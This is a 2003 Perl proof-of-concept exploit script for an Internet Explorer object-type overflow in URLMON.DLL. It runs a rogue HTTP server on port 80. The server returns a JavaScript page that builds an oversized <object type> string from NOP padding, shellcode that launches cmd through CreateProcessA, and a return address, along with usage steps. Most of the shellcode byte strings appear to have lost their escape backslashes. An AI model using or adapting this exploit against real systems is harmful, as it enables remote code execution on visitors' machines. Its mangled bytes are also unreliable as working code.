#!/usr/bin/perl

#=synopsis
# 06/06/03 - Proof of concept exploit by Sir Alumni (alumni ok kz)
# IE-Object longtype dynamic call overflow
# [...]
# url://<$shellcode><'/'x48><jmp %ptr_sh>
# the flaw actually exists in URLMON.DLL when converting backslashes
# to wide char,
# this can be seen on stack dump near '&CLSID=AAA...2F__2F__...'.
# [...]
#
# To exploit: i) start server perl script;
# ii) connect to http-service using IE/5.x.
# Tested: IE-5.x, 6.0? on Windows 98.
# Note: a) the shellcode size is limited up to 56 bytes;
# b) the '$ret' may differ as well as the image base of KERNEL32.DLL;
# c) to avoid multiple encoding the shellcode is given 'as is' with help of JScript.
#=synopsis

use IO::Socket;

$port = 80;
$server = IO::Socket::INET->new (LocalPort => $port,
Type =>SOCK_STREAM,
Reuse => 1,
Listen => $port) or die("Couldnt't create
server socket ");

$shellcode = "x33xdb". # xor ebx, ebx
	"x8bxd4". # mov edx, esp
	"x80xc6xff". # add dh, 0xFF
	"xc7x42xfcx63x6d". # mov dword ptr[edx-4], 0x01646D63 ("cmdx01")
	"x64x01". #
	"x88x5axff". # mov byte ptr[edx-1], bl
	"x8dx42xfc". # lea eax, [edx-4]
	"x8bxf5". # mov esi, ebp
	"x56x52". # push esi; push edx
	"x53x53x53x53x53x53". # push ebx
	"x50x53". # push eax; push ebx
	"xb8x41x77xf7xbf". # mov eax, 0xBFF77741 ~= CreateProcessA
	"xffxd0". # call eax
	"xb8xf8xd4xf8xbf". # mov eax, 0xBFF8D4F8 ~= ExitProcess
	"xffxd0". # call eax
	"xcc"; # int 3

$nop = "x90";
$ret = "\xAB\x5D\x58";

while ($client = $server->accept()) {
	while (<$client>) {
		if ($_ =~ /^(x0Dx0A)/) {

			print $client <<END_DATA;
			HTTP/1.0 200 Ok
			Content-Type: text/html

			<script>
				var mins = 56;
				var size = 48;
				var sploit = "$shellcode";
				var strNop = "$nop";
				var strObj = '<object type="';
				
				for (i=0;i<mins-sploit.length;i++) strObj += strNop;
				
				strObj += sploit;
				
				for (i=0;i<size;i++) strObj += '/';
				
				strObj += "CCCCCCCCDDDDDDDD";
				strObj += "$ret";
				strObj += '">Hello</object>';
				
				alert(strObj);
				
				document.write(strObj);
			</script>
			END_DATA
			close($client);
		}
	}
}

close($server);
